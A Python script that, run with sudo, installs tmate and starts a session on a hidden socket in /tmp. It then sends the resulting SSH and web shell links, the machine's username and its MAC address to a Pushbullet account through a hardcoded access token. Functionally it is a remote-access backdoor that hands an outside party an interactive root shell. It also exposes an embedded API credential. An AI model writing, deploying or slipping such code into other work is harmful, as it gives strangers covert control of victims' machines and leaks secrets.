#!/usr/bin/python3
import subprocess
import requests
import sys
import os
import re

def is_connected():
    try:
        response = requests.get("https://www.google.com/", timeout=5)
        return response.status_code == 200
    except requests.ConnectionError:
        return False
    except requests.Timeout:
        return False

def get_username():
    try:
        users = os.listdir("/home/")
        return users[0] if users else "unknown"
    except FileNotFoundError:
        return "unknown".title()
    except Exception as e:
        raise e

def get_mac_address():
    try:
        result = subprocess.check_output(["ip", "link", "show"], universal_newlines=True)
        match = re.search(r"link/ether (\S+)", result)
        return match.group(1).upper() if match else "MAC address not found."
    except subprocess.CalledProcessError:
        return "MAC address not found."
    except Exception as e:
        raise e

def install_tmate():
    try:
        os.system("apt -y update")
        os.system("apt -y install tmate")
    except Exception as e:
        raise e

def send_pushbullet_message(payload=None):
    try:
        title = f"{payload.get('username')} - {payload.get('mac_address')}"
        body = f"{payload.get('ssh_session')}\n{payload.get('web_session')}"
        json_data = {"type": "note", "title": title, "body": body}
        headers = {"Access-Token": "o.rY33yfuTAydAwenoqsWKF4c6edEWBYWo", "Content-Type": "application/json"}
        response = requests.post("https://api.pushbullet.com/v2/pushes", headers=headers, json=json_data)
        return response.ok
    except requests.exceptions.RequestException:
        return False

def generate_new_session(session_file):
    try:
        status = False
        if not os.path.exists(session_file):
            subprocess.run(f"tmate -S {session_file} new-session -d -c ~", shell=True, check=True)
            subprocess.run(f"tmate -S {session_file} wait tmate-ready", shell=True, check=True)
            status = True

        process = subprocess.Popen(f"tmate -S {session_file} display -p '#{{tmate_ssh}}'", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        session_output, _ = process.communicate()
        ssh_session = session_output.decode().strip()
        web_session = ssh_session.split("@")[0].replace("ssh ", "https://tmate.io/t/")
        return status, ssh_session, web_session
    except subprocess.CalledProcessError:
        return None, None
    except Exception as e:
        raise e

def main():
    try:
        if os.geteuid() != 0:
            print("Error: This script must be run with sudo.")
            sys.exit(1)

        print("Checking internet connectivity...")
        if is_connected():
            print("Internet connection established.")

            if not os.path.exists("/usr/bin/tmate"):
                print("Installing tmate...")
                install_tmate()

            print("Generating new tmate session...")
            session_file = "/tmp/.private-session.sock"
            status, ssh_session, web_session = generate_new_session(session_file)
            if ssh_session and web_session:
                print("Tmate session generated successfully.")
                payload = {
                    "username": get_username(),
                    "mac_address": get_mac_address(),
                    "ssh_session": ssh_session,
                    "web_session": web_session
                }
                
                if status:
                    response = send_pushbullet_message(payload=payload)
                    if response:
                        print("Message sent successfully.")
                    else:
                        print("Failed to send message.")

            else:
                print("Failed to generate tmate session.")
        else:
            print("No internet connection available.")

    except KeyboardInterrupt:
        print("Script terminated by the user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__=="__main__":
    main()
